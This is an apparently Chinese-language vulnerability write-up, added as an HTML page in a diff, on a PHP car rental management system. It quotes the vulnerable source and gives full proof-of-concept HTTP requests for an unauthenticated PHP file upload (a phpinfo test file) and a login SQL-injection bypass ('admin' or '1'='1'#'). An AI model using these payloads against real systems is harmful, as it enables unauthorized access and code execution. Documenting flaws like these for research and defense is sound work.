@@ -1,0 +1,147 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="b9ada2c870a340dde990adc21386c1d0">前言</h2>
+<p>一个比较简单的国外的车辆信息发布管理系统，看到有人还提了CVE就简单的看了下。记录下存在的两类洞sql注入和未授权文件上传，其中sql注入存在多处以下只记录了一处。</p>
+<h2 data-content="1" id="c62219a895769a1194e289a652d2b5fa">一、未授权文件上传</h2>
+<p><strong>代码漏洞位置</strong>：</p>
+<p><code>\admin\admin_class.php</code> ，第282-309行<code>save_car()</code>函数，如下所示：</p>
+<div class="highlight"><pre><span></span><span class="x">function save_car(){</span>
+<span class="x">        extract($_POST);</span>
+<span class="x">        $data = "";</span>
+<span class="x">        foreach($_POST as $k =&gt; $v){</span>
+<span class="x">            if(!in_array($k, array('id','img','description')) &amp;&amp; !is_numeric($k)){</span>
+<span class="x">                if(empty($data)){</span>
+<span class="x">                    $data .= " $k='$v' ";</span>
+<span class="x">                }else{</span>
+<span class="x">                    $data .= ", $k='$v' ";</span>
+<span class="x">                }</span>
+<span class="x">            }</span>
+<span class="x">        }</span>
+<span class="x">        $data .= ", description = '".htmlentities(str_replace("'","&amp;#x2019;",$description))."' ";</span>
+<span class="x">        if($_FILES['img']['tmp_name'] != ''){</span>
+<span class="x">                        $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];</span>
+<span class="x">                        $fname = str_replace(" ", '', $fname);</span>
+<span class="x">                        $move = move_uploaded_file($_FILES['img']['tmp_name'],'assets/uploads/cars_img/'. $fname);</span>
+<span class="x">                    $data .= ", img_path = '$fname' ";</span>
+<span class="x">        }</span>
+<span class="x">        if(empty($id)){</span>
+<span class="x">            $save = $this-&gt;db-&gt;query("INSERT INTO cars set $data");</span>
+<span class="x">        }else{</span>
+<span class="x">            $save = $this-&gt;db-&gt;query("UPDATE cars set $data where id = $id");</span>
+<span class="x">        }</span>
+
+<span class="x">        if($save)</span>
+<span class="x">            return 1;</span>
+<span class="x">    }</span>
+</pre></div>
+<p>如上代码所示，直接将前端传入的文件数据进行保存并没有对文件内容做校验，然后用<code>时间+_原文件名</code>生成新的文件名进行存储至<code>admin/assets/uploads/cars_img</code>目录下：</p>
+<p><strong>漏洞复现</strong>：</p>
+<pre><code>POST /admin/ajax.php?action=save_car HTTP/1.1  
+Host: 192.168.254.1  
+Content-Length: 1081  
+Accept: */*  
+X-Requested-With: XMLHttpRequest  
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36  
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX98edFXJqWpvI5cf  
+Origin: http://192.168.254.1  
+Referer: http://192.168.254.1/admin/index.php?page=manage_car  
+Accept-Encoding: gzip, deflate  
+Accept-Language: zh-CN,zh;q=0.9  
+Connection: close  
+
+------WebKitFormBoundaryX98edFXJqWpvI5cf  
+Content-Disposition: form-data; name="id"  
+
+
+------WebKitFormBoundaryX98edFXJqWpvI5cf  
+Content-Disposition: form-data; name="brand"  
+
+111  
+------WebKitFormBoundaryX98edFXJqWpvI5cf  
+Content-Disposition: form-data; name="model"  
+
+111  
+------WebKitFormBoundaryX98edFXJqWpvI5cf  
+Content-Disposition: form-data; name="category_id"  
+
+5  
+------WebKitFormBoundaryX98edFXJqWpvI5cf  
+Content-Disposition: form-data; name="engine_id"  
+
+3  
+------WebKitFormBoundaryX98edFXJqWpvI5cf  
+Content-Disposition: form-data; name="transmission_id"  
+
+3  
+------WebKitFormBoundaryX98edFXJqWpvI5cf  
+Content-Disposition: form-data; name="description"  
+
+111111111  
+------WebKitFormBoundaryX98edFXJqWpvI5cf  
+Content-Disposition: form-data; name="price"  
+
+10  
+------WebKitFormBoundaryX98edFXJqWpvI5cf  
+Content-Disposition: form-data; name="qty"  
+
+10  
+------WebKitFormBoundaryX98edFXJqWpvI5cf  
+Content-Disposition: form-data; name="img"; filename="1.php"  
+Content-Type: application/octet-stream  
+
+&lt;?php phpinfo();?&gt;  
+------WebKitFormBoundaryX98edFXJqWpvI5cf--</code></pre>
+<p>发送上述POC数据包，返回1表示上传成功：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20201118191507-50689318-298f-1.png"/><br/>
+可在网站首页找到上传图片马的位置，如下所示：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20201118191531-5f1bc056-298f-1.png"/><br/>
+访问即可看到相应的phpinfo界面<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20201118191555-6d0a0e98-298f-1.png"/></p>
+<h2 data-content="1" id="105d9c4023bd82172108029e90eb1134">二、注册处sql注入</h2>
+<p><strong>代码位置</strong>：</p>
+<p><code>admin\admin_class.php</code>, 第18-38行 <code>login()</code>函数如下所示：</p>
+<div class="highlight"><pre><span></span><span class="x">function login(){</span>
+
+<span class="x">            extract($_POST);        </span>
+<span class="x">            $qry = $this-&gt;db-&gt;query("SELECT * FROM users where username = '".$username."' and password = '".md5($password)."' ");</span>
+<span class="x">            if($qry-&gt;num_rows &gt;0){</span>
+<span class="x">                foreach ($qry-&gt;fetch_array() as $key =&gt; $value) {</span>
+<span class="x">                    if($key != 'passwors' &amp;&amp; !is_numeric($key))</span>
+<span class="x">                        $_SESSION['login_'.$key] = $value;</span>
+<span class="x">                }</span>
+<span class="x">                if($_SESSION['login_type'] != 1){</span>
+<span class="x">                    foreach ($_SESSION as $key =&gt; $value) {</span>
+<span class="x">                        unset($_SESSION[$key]);</span>
+<span class="x">                    }</span>
+<span class="x">                    return 2 ;</span>
+<span class="x">                    exit;</span>
+<span class="x">                }</span>
+<span class="x">                    return 1;</span>
+<span class="x">            }else{</span>
+<span class="x">                return 3;</span>
+<span class="x">            }</span>
+<span class="x">    }</span>
+</pre></div>
+<p>直接将前端传入的<code>username</code>拼接入sql语句拼接入sql语句中造成sql注入。当返回1时表示登陆成功。</p>
+<p><strong>漏洞复现：</strong></p>
+<pre><code>POST /admin/ajax.php?action=login HTTP/1.1
+Host: 192.168.254.1
+Content-Length: 42
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://192.168.254.1
+Referer: http://192.168.254.1/admin/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=calieaq0hnnh4g9dsf4agr7eh3
+Connection: close
+
+username=admin' or '1'='1'#&amp;password=123456</code></pre>
+<p>在登陆口用户名输入处输入<code>admin' or '1'='1'#</code>,成功登陆<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20201118191744-ae75a8d8-298f-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20201118191757-b626729c-298f-1.png"/><br/>
+<a href="https://www.sourcecodester.com/php/14544/car-rental-management-system-using-phpmysqli-source-code.html" target="_blank">源码地址</a></p>
+</div>
+</div>
